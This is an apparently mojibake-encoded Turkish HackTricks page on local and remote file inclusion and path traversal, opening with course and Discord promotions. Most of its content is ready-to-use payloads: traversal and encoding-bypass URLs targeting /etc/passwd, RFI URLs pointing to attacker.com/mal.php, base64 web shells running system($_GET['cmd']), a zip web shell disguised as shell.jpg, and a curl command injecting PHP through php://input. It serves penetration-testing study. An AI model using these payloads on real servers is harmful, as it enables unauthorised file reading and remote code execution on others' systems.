# Dosya Dahil Etme/Yol GeÃ§iÅŸi

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**]'yi (https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**]'i (https://opensea.io/collection/the-peass-family) iÃ§eren koleksiyonumuzu
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubumuza**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking hilelerinizi paylaÅŸarak HackTricks ve HackTricks Cloud** github depolarÄ±na PR gÃ¶ndererek.

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hackleme Ä°Ã§gÃ¶rÃ¼leri**\
Hackleme heyecanÄ±na ve zorluklarÄ±na inen iÃ§eriklerle etkileÅŸime girin

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hackleme dÃ¼nyasÄ±nda gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle gÃ¼ncel kalÄ±n

**En Son Duyurular**\
Yeni Ã¶dÃ¼l avÄ± baÅŸlatmalarÄ± ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgilenin

**Bize katÄ±lÄ±n** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸine baÅŸlayÄ±n!

## Dosya Dahil Etme

**Uzak Dosya Dahil Etme (RFI):** Dosya uzak sunucudan yÃ¼klenir (En Ä°yi: Kodu yazabilir ve sunucu onu yÃ¼rÃ¼tÃ¼r). Php'de bu varsayÄ±lan olarak **devre dÄ±ÅŸÄ±** bÄ±rakÄ±lmÄ±ÅŸtÄ±r (**allow\_url\_include**).\
**Yerel Dosya Dahil Etme (LFI):** Sunucu yerel bir dosyayÄ± yÃ¼kler.

Bu zafiyet, kullanÄ±cÄ±nÄ±n sunucu tarafÄ±ndan yÃ¼klenecek dosyayÄ± bir ÅŸekilde kontrol edebildiÄŸi durumlarda meydana gelir.

Zarar gÃ¶rebilecek **PHP fonksiyonlarÄ±**: require, require\_once, include, include\_once

Bu zafiyeti sÃ¶mÃ¼rmek iÃ§in ilginÃ§ bir araÃ§: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## KÃ¶r - Ä°lginÃ§ - LFI2RCE dosyalarÄ±
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Ã‡eÅŸitli \*nix LFI listelerini karÄ±ÅŸtÄ±rarak ve daha fazla yol ekleyerek ÅŸunu oluÅŸturdum:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

AyrÄ±ca `/` yerine `\` kullanmayÄ± deneyin\
AyrÄ±ca `../../../../../` eklemeyi deneyin

Dosya /etc/password'Ã¼ bulmak iÃ§in Ã§eÅŸitli teknikler kullanan bir liste [burada](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) bulunabilir.

### **Windows**

FarklÄ± kelime listelerinin birleÅŸimi:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

AyrÄ±ca `/` yerine `\` kullanmayÄ± deneyin\
AyrÄ±ca `C:/`'yi kaldÄ±rÄ±p `../../../../../` eklemeyi deneyin

Dosya /boot.ini'yi bulmak iÃ§in Ã§eÅŸitli teknikler kullanan bir liste [burada](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) bulunabilir.

### **OS X**

Linux'un LFI listesini kontrol edin.

## Temel LFI ve bypasslar

TÃ¼m Ã¶rnekler Yerel Dosya Dahil etme iÃ§in olsa da Uzak Dosya Dahil etme iÃ§in de uygulanabilir (sayfa=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### sÄ±ralama dizileri yinelemesiz olarak kaldÄ±rÄ±ldÄ±
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Verilen dizenin sonuna daha fazla karakter ekleyerek atlayÄ±n (atlatma: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Bu, **PHP 5.4'ten beri Ã§Ã¶zÃ¼lmÃ¼ÅŸtÃ¼r**

### **Kodlama**

Ã‡ift URL kodlamasÄ± gibi standart olmayan kodlamalarÄ± kullanabilirsiniz:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Var olan klasÃ¶rden

Belki de arka uÃ§, klasÃ¶r yolunu kontrol ediyor:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Sunucudaki Dosya Sistemi Dizinlerini KeÅŸfetme

Bir sunucunun dosya sistemi, belirli teknikleri kullanarak sadece dosyalarÄ± deÄŸil, dizinleri de tanÄ±mlamak iÃ§in rekÃ¼rsif olarak keÅŸfedilebilir. Bu sÃ¼reÃ§, dizin derinliÄŸini belirlemeyi ve belirli klasÃ¶rlerin varlÄ±ÄŸÄ±nÄ± sorgulamayÄ± iÃ§erir. AÅŸaÄŸÄ±da bunu baÅŸarmak iÃ§in detaylÄ± bir yÃ¶ntem bulunmaktadÄ±r:

1. **Dizin DerinliÄŸini Belirleme:** Mevcut dizinin derinliÄŸini belirleyin ve `/etc/passwd` dosyasÄ±nÄ± baÅŸarÄ±lÄ± bir ÅŸekilde alarak (sunucu Linux tabanlÄ± ise geÃ§erlidir) dizin derinliÄŸinizi belirleyin. Bir Ã¶rnek URL aÅŸaÄŸÄ±daki gibi yapÄ±landÄ±rÄ±lmÄ±ÅŸ olabilir ve Ã¼Ã§ derinlik seviyesini gÃ¶sterebilir:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **KlasÃ¶rleri AraÅŸtÄ±rma:** ÅÃ¼phelenilen klasÃ¶rÃ¼n adÄ±nÄ± (Ã¶rneÄŸin, `private`) URL'ye ekleyin, ardÄ±ndan `/etc/passwd` dizinine geri gidin. Ek klasÃ¶r seviyesi, derinliÄŸi bir artÄ±rmayÄ± gerektirir:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **SonuÃ§larÄ± YorumlayÄ±n:** Sunucunun yanÄ±tÄ±, klasÃ¶rÃ¼n varlÄ±ÄŸÄ±nÄ± gÃ¶sterir:
   * **Hata / Ã‡Ä±ktÄ± Yok:** `private` klasÃ¶rÃ¼nÃ¼n belirtilen konumda muhtemelen mevcut olmadÄ±ÄŸÄ±nÄ± gÃ¶sterir.
   * **`/etc/passwd` DosyasÄ±nÄ±n Ä°Ã§eriÄŸi:** `private` klasÃ¶rÃ¼nÃ¼n varlÄ±ÄŸÄ± doÄŸrulanmÄ±ÅŸtÄ±r.
4. **RekÃ¼rsif KeÅŸif:** KeÅŸfedilen klasÃ¶rler, aynÄ± teknik veya geleneksel Yerel Dosya Dahil Etme (LFI) yÃ¶ntemleri kullanÄ±larak alt dizinler veya dosyalar iÃ§in daha fazla sorgulanabilir.

Dosya sisteminde farklÄ± konumlardaki dizinleri keÅŸfetmek iÃ§in yÃ¼kÃ¼ uygun ÅŸekilde ayarlayÄ±n. Ã–rneÄŸin, `/var/www/` dizininde `private` adlÄ± bir dizin bulunup bulunmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in (mevcut dizinin derinliÄŸinin 3 olduÄŸunu varsayarak) kullanÄ±n:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Yol KÄ±saltma TekniÄŸi**

Yol kÄ±saltma, web uygulamalarÄ±ndaki dosya yollarÄ±nÄ± manipÃ¼le etmek iÃ§in kullanÄ±lan bir yÃ¶ntemdir. Genellikle, dosya yollarÄ±nÄ±n sonuna ek karakterler ekleyen belirli gÃ¼venlik Ã¶nlemlerini atlayarak kÄ±sÄ±tlanmÄ±ÅŸ dosyalara eriÅŸmek iÃ§in kullanÄ±lÄ±r. AmacÄ±, gÃ¼venlik Ã¶nlemi tarafÄ±ndan deÄŸiÅŸtirildiÄŸinde hala istenilen dosyaya iÅŸaret eden bir dosya yolunu oluÅŸturmaktÄ±r.

PHP'de, bir dosya yolunun Ã§eÅŸitli temsilleri, dosya sisteminin doÄŸasÄ± gereÄŸi eÅŸdeÄŸer kabul edilebilir. Ã–rneÄŸin:

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` ve `/etc/passwd/` tÃ¼mÃ¼ aynÄ± yol olarak iÅŸlenir.
* Son 6 karakter `passwd` ise, bir `/` eklemek (`passwd/` yapmak) hedeflenen dosyayÄ± deÄŸiÅŸtirmez.
* Benzer ÅŸekilde, bir dosya yoluna `.php` eklenirse (Ã¶rneÄŸin `shellcode.php`), sonuna `/.` eklemek eriÅŸilen dosyayÄ± deÄŸiÅŸtirmez.

SaÄŸlanan Ã¶rnekler, `/etc/passwd`'ye eriÅŸmek iÃ§in yol kÄ±saltmayÄ± nasÄ±l kullanacaÄŸÄ±nÄ±zÄ± gÃ¶stermektedir, bu hassas iÃ§eriÄŸe sahip yaygÄ±n bir hedefdir (kullanÄ±cÄ± hesap bilgileri):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Bu senaryolarda, gereken geÃ§iÅŸ sayÄ±sÄ± yaklaÅŸÄ±k olarak 2027 olabilir, ancak bu sayÄ± sunucunun yapÄ±landÄ±rmasÄ±na baÄŸlÄ± olarak deÄŸiÅŸebilir.

* **Nokta Segmentleri ve Ek Karakterler Kullanma**: GeÃ§iÅŸ dizileri (`../`), ek nokta segmentleri ve karakterlerle birleÅŸtirilerek dosya sisteminde gezinmek iÃ§in kullanÄ±labilir, sunucu tarafÄ±ndan eklenen dizeleri etkisiz hale getirerek istenilen yolun (`/etc/passwd`) korunduÄŸundan emin olunabilir.
* **Gerekli GeÃ§iÅŸ SayÄ±sÄ±nÄ±n Belirlenmesi**: Deneme yanÄ±lma yoluyla, kÃ¶k dizinine ve ardÄ±ndan `/etc/passwd`'ye gezinmek iÃ§in gereken `../` dizilerinin kesin sayÄ±sÄ±nÄ± bulabilir ve herhangi bir eklenen dizenin (Ã¶rneÄŸin `.php`) etkisiz hale getirildiÄŸinden emin olabilirsiniz.
* **Sahte Bir Dizinle BaÅŸlamak**: Yolun var olmayan bir dizinle baÅŸlatÄ±lmasÄ± (Ã¶rneÄŸin `a/`) yaygÄ±n bir uygulamadÄ±r. Bu teknik, bir Ã¶nlem olarak veya sunucunun yol ayrÄ±ÅŸtÄ±rma mantÄ±ÄŸÄ±nÄ± karÅŸÄ±lamak iÃ§in kullanÄ±lÄ±r.

Yol kÄ±rpma tekniklerini kullanÄ±rken, sunucunun yol ayrÄ±ÅŸtÄ±rma davranÄ±ÅŸÄ±nÄ± ve dosya sistemi yapÄ±sÄ±nÄ± anlamanÄ±z Ã¶nemlidir. Her senaryo farklÄ± bir yaklaÅŸÄ±m gerektirebilir ve en etkili yÃ¶ntemi bulmak iÃ§in genellikle test yapmak gerekir.

**Bu zayÄ±flÄ±k PHP 5.3'te dÃ¼zeltildi.**

### **Filtre atlatma hileleri**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Uzak Dosya Dahil Etme

Php'de bu varsayÄ±lan olarak devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸtÄ±r Ã§Ã¼nkÃ¼ **`allow_url_include`** **KapalÄ±dÄ±r.** Ã‡alÄ±ÅŸmasÄ± iÃ§in **AÃ§Ä±k** olmalÄ±dÄ±r ve bu durumda sunucunuzdan bir PHP dosyasÄ±nÄ± dahil edebilir ve RCE elde edebilirsiniz:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
EÄŸer bir nedenden dolayÄ± **`allow_url_include`** etkinse, ancak PHP dÄ±ÅŸ web sayfalarÄ±na eriÅŸimi **filtreliyorsa**, [bu yazÄ±ya](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/) gÃ¶re, Ã¶rneÄŸin base64 ile kodlanmÄ±ÅŸ bir b64 PHP kodunu Ã§Ã¶zmek ve RCE elde etmek iÃ§in data protokolÃ¼nÃ¼ kullanabilirsiniz:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
Ã–nceki kodda, son `+.txt` eklenmiÅŸtir Ã§Ã¼nkÃ¼ saldÄ±rganÄ±n `.txt` ile biten bir dizeye ihtiyacÄ± vardÄ±, bÃ¶ylece dize onunla biter ve b64 decode iÅŸleminden sonra o kÄ±sÄ±m sadece gereksiz veri dÃ¶necek ve gerÃ§ek PHP kodu dahil edilecek (ve dolayÄ±sÄ±yla, yÃ¼rÃ¼tÃ¼lecek).
{% endhint %}

`php://` protokolÃ¼nÃ¼ **kullanmayan baÅŸka bir Ã¶rnek** ÅŸÃ¶yle olabilir:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python KÃ¶k Ã¶ÄŸesi

Python'da ÅŸu gibi bir kodda:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
EÄŸer kullanÄ±cÄ± **`file_name`**'e **mutlak bir yol** geÃ§irirse, **Ã¶nceki yol sadece kaldÄ±rÄ±lÄ±r**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
AÅŸaÄŸÄ±daki, [belgelerde](https://docs.python.org/3.10/library/os.path.html#os.path.join) belirtildiÄŸi gibi amaÃ§lanan davranÄ±ÅŸtÄ±r:

> Bir bileÅŸen mutlak bir yol ise, tÃ¼m Ã¶nceki bileÅŸenler atÄ±lÄ±r ve birleÅŸtirme mutlak yol bileÅŸeninden devam eder.

## Java Dizinleri Listeleme

Java'da bir Yol GeÃ§iÅŸi (Path Traversal) olduÄŸunda ve bir dosya yerine bir **dizin istendiÄŸinde**, **dizin listesi dÃ¶ndÃ¼rÃ¼lÃ¼r**. Bu diÄŸer dillerde (bildiÄŸim kadarÄ±yla) gerÃ§ekleÅŸmeyecektir.

## En Ä°yi 25 Parametre

Ä°ÅŸte yerel dosya dahil etme (LFI) aÃ§Ä±klÄ±klarÄ±na karÅŸÄ± savunmasÄ±z olabilecek en iyi 25 parametre listesi ([baÄŸlantÄ±dan](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## PHP sargÄ±layÄ±cÄ±larÄ± ve protokollerini kullanarak LFI / RFI

### php://filter

PHP filtreleri, veriler Ã¼zerinde **temel deÄŸiÅŸtirme iÅŸlemlerini** gerÃ§ekleÅŸtirmeyi saÄŸlar. 5 kategoriye ayrÄ±lÄ±rlar:

* [Dize Filtreleri](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Veriden etiketleri kaldÄ±rÄ±r ("<" ve ">" karakterleri arasÄ±ndaki her ÅŸey)
* Bu filtre modern PHP sÃ¼rÃ¼mlerinden kaybolmuÅŸtur
* [DÃ¶nÃ¼ÅŸÃ¼m Filtreleri](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : FarklÄ± bir kodlamaya dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r (`convert.iconv.<giriÅŸ_kodlama>.<Ã§Ä±kÄ±ÅŸ_kodlama>`). Desteklenen **tÃ¼m kodlamalarÄ±n listesini** almak iÃ§in konsolda Ã§alÄ±ÅŸtÄ±rÄ±n: `iconv -l`

{% hint style="warning" %}
`convert.iconv.*` dÃ¶nÃ¼ÅŸÃ¼m filtresini kÃ¶tÃ¼ye kullanarak **keyfi metin oluÅŸturabilirsiniz**, bu da keyfi metin yazmak veya keyfi metin iÅŸleme iÅŸlevi oluÅŸturmak iÃ§in yararlÄ± olabilir. Daha fazla bilgi iÃ§in [**php filtreleri aracÄ±lÄ±ÄŸÄ±yla LFI2RCE**](lfi2rce-via-php-filters.md)'ye bakÄ±n.
{% endhint %}

* [SÄ±kÄ±ÅŸtÄ±rma Filtreleri](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Ä°Ã§eriÄŸi sÄ±kÄ±ÅŸtÄ±rÄ±r (Ã§ok fazla bilgiyi dÄ±ÅŸarÄ± Ã§Ä±karmak iÃ§in kullanÄ±ÅŸlÄ±dÄ±r)
* `zlib.inflate`: Veriyi aÃ§ar
* [Åifreleme Filtreleri](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : KullanÄ±mdan kaldÄ±rÄ±ldÄ±
* `mdecrypt.*` : KullanÄ±mdan kaldÄ±rÄ±ldÄ±
* DiÄŸer Filtreler
* `var_dump(stream_get_filters());` komutunu Ã§alÄ±ÅŸtÄ±rarak php'de birkaÃ§ **beklenmeyen filtre** bulabilirsiniz:
* `consumed`
* `dechunk`: HTTP parÃ§alÄ± kodlamayÄ± tersine Ã§evirir
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,Â£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
"php://filter" kÄ±smÄ± harf bÃ¼yÃ¼klÃ¼ÄŸÃ¼ne duyarsÄ±zdÄ±r
{% endhint %}

### Php filtrelerini rastgele dosyalarÄ± okumak iÃ§in oracle olarak kullanma

[**Bu yazÄ±da**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) sunucudan geri dÃ¶nen Ã§Ä±ktÄ± olmadan yerel bir dosyayÄ± okumak iÃ§in bir teknik Ã¶nerilmektedir. Bu teknik, **php filtrelerini oracle olarak kullanarak dosyayÄ± (karakter karakter) okuma** Ã¼zerine kuruludur. Bu, php filtrelerinin bir metni yeterince bÃ¼yÃ¼k yapmak iÃ§in kullanÄ±labileceÄŸi ve php'nin bir istisna fÄ±rlatmasÄ±na neden olabileceÄŸi gerÃ§eÄŸine dayanmaktadÄ±r.

Orijinal yazÄ±da teknik hakkÄ±nda detaylÄ± bir aÃ§Ä±klama bulabilirsiniz, ancak iÅŸte hÄ±zlÄ± bir Ã¶zet:

* Metnin baÅŸÄ±ndaki karakteri bÄ±rakmak iÃ§in **`UCS-4LE`** kodlamasÄ±nÄ± kullanÄ±n ve dize boyutunu Ã¼ssel olarak artÄ±rÄ±n.
* Bu, **baÅŸlangÄ±Ã§ harfi doÄŸru tahmin edildiÄŸinde php'nin bir hata fÄ±rlatacaÄŸÄ± kadar bÃ¼yÃ¼k bir metin oluÅŸturmak iÃ§in kullanÄ±lacaktÄ±r**
* **Dechunk** filtresi, **ilk karakterin onaltÄ±lÄ±k olmadÄ±ÄŸÄ±nÄ± belirlerse her ÅŸeyi kaldÄ±rÄ±r**, bu nedenle ilk karakterin onaltÄ±lÄ±k olup olmadÄ±ÄŸÄ±nÄ± bilebiliriz.
* Bu, Ã¶ncekiyle birleÅŸtirildiÄŸinde (ve tahmin edilen harfe baÄŸlÄ± diÄŸer filtrelerle), metnin baÅŸÄ±ndaki bir harfi tahmin etmemize izin verecektir. Ã‡Ã¼nkÃ¼ eÄŸer onaltÄ±lÄ±ksa, dechunk onu silmeyecek ve baÅŸlangÄ±Ã§ bombasÄ± php hatasÄ±na neden olacaktÄ±r.
* **convert.iconv.UNICODE.CP930** kodlayÄ±cÄ±sÄ± her harfi bir sonraki harfe dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r (bu nedenle bu kodlayÄ±cÄ±dan sonra: a -> b). Bu, Ã¶rneÄŸin ilk harfin `a` olup olmadÄ±ÄŸÄ±nÄ± keÅŸfetmemizi saÄŸlar Ã§Ã¼nkÃ¼ 6 kez bu kodlayÄ±cÄ±yÄ± uygularsak a->b->c->d->e->f->g harf artÄ±k onaltÄ±lÄ±k bir karakter olmaz, bu nedenle dechunk onu silmez ve php hatasÄ± baÅŸlangÄ±Ã§ bombasÄ± ile Ã§arpÄ±ÅŸÄ±r.
* BaÅŸlangÄ±Ã§ta **rot13** gibi diÄŸer dÃ¶nÃ¼ÅŸÃ¼mleri kullanarak n, o, p, q, r gibi diÄŸer karakterleri sÄ±zdÄ±rmak mÃ¼mkÃ¼ndÃ¼r (ve diÄŸer kodlayÄ±cÄ±lar diÄŸer harfleri onaltÄ±lÄ±k aralÄ±ÄŸa taÅŸÄ±mak iÃ§in kullanÄ±labilir).
* BaÅŸlangÄ±Ã§ karakteri bir sayÄ± olduÄŸunda, bunu base64 kodlamak ve sayÄ±yÄ± sÄ±zdÄ±rmak iÃ§in ilk 2 harfi sÄ±zdÄ±rmak gerekir.
* **Daha fazla veri sÄ±zdÄ±rmak iÃ§in** baÅŸlangÄ±Ã§ta **2 byte'lÄ±k gereksiz veri oluÅŸturmak** ve **UCS-4LE** uygulayarak bunu **bir sonraki 2 byte ile birleÅŸtirmek** ve **gereksiz veriye kadar veriyi silmek** gereklidir (bu, baÅŸlangÄ±Ã§ metninin ilk 2 byte'Ä±nÄ± kaldÄ±racaktÄ±r). Bu istenen bit'e ulaÅŸana kadar bunu yapmaya devam edin.

YazÄ±da bunu otomatik olarak gerÃ§ekleÅŸtirmek iÃ§in bir araÃ§ de sÄ±zdÄ±rÄ±ldÄ±: [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).

### php://fd

Bu sarmalayÄ±cÄ±, iÅŸlemin aÃ§Ä±k olan dosya tanÄ±mlayÄ±cÄ±larÄ±na eriÅŸim saÄŸlar. AÃ§Ä±k dosyalarÄ±n iÃ§eriÄŸini sÄ±zdÄ±rmak iÃ§in potansiyel olarak kullanÄ±ÅŸlÄ± olabilir:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
AyrÄ±ca **php://stdin, php://stdout ve php://stderr** kullanarak sÄ±rasÄ±yla **dosya tanÄ±mlayÄ±cÄ±larÄ± 0, 1 ve 2'ye** eriÅŸebilirsiniz (bu nasÄ±l bir saldÄ±rÄ±da kullanÄ±labilir emin deÄŸilim)

### zip:// ve rar://

Ä°Ã§inde bir PHPShell bulunan bir Zip veya Rar dosyasÄ± yÃ¼kleyin ve eriÅŸin.\
Rar protokolÃ¼nÃ¼ istismar edebilmek iÃ§in **Ã¶zellikle etkinleÅŸtirilmesi gerekir**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

data://, veri dosyalarÄ±nÄ± iÃ§e aktarmak iÃ§in kullanÄ±lan bir URI ÅŸemasÄ±dÄ±r. Bu ÅŸema, web uygulamalarÄ±nda dosya iÃ§e aktarma saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±labilir. SaldÄ±rgan, veri dosyalarÄ±nÄ± hedef uygulamaya iÃ§e aktararak hassas bilgilere eriÅŸebilir veya kÃ¶tÃ¼ amaÃ§lÄ± kodlarÄ± yÃ¼rÃ¼tebilir. Bu nedenle, web uygulamalarÄ±nÄ±n veri:// URI ÅŸemasÄ±nÄ± kabul etmemesi veya doÄŸru bir ÅŸekilde iÅŸlemesi Ã¶nemlidir.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Bu protokolÃ¼n php yapÄ±landÄ±rmalarÄ± tarafÄ±ndan kÄ±sÄ±tlandÄ±ÄŸÄ±nÄ± unutmayÄ±n **`allow_url_open`** ve **`allow_url_include`**

### expect://

Expect etkinleÅŸtirilmelidir. Bunu kullanarak kodu yÃ¼rÃ¼tebilirsiniz:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POST parametrelerindeki yÃ¼kÃ¼nÃ¼zÃ¼ belirtin:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Bir `.phar` dosyasÄ±, bir web uygulamasÄ± dosya yÃ¼kleme iÃ§in `include` gibi iÅŸlevleri kullandÄ±ÄŸÄ±nda PHP kodunu yÃ¼rÃ¼tmek iÃ§in kullanÄ±labilir. AÅŸaÄŸÄ±daki PHP kod parÃ§acÄ±ÄŸÄ±, bir `.phar` dosyasÄ±nÄ±n nasÄ±l oluÅŸturulacaÄŸÄ±nÄ± gÃ¶stermektedir:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` dosyasÄ±nÄ± derlemek iÃ§in aÅŸaÄŸÄ±daki komut Ã§alÄ±ÅŸtÄ±rÄ±lmalÄ±dÄ±r:
```bash
php --define phar.readonly=0 create_path.php
```
YÃ¼rÃ¼tÃ¼ldÃ¼ÄŸÃ¼nde, `test.phar` adÄ±nda bir dosya oluÅŸturulur, bu da Potansiyel olarak Yerel Dosya Dahil Etme (LFI) gÃ¼venlik aÃ§Ä±klarÄ±nÄ± sÃ¶mÃ¼rmek iÃ§in kullanÄ±labilir.

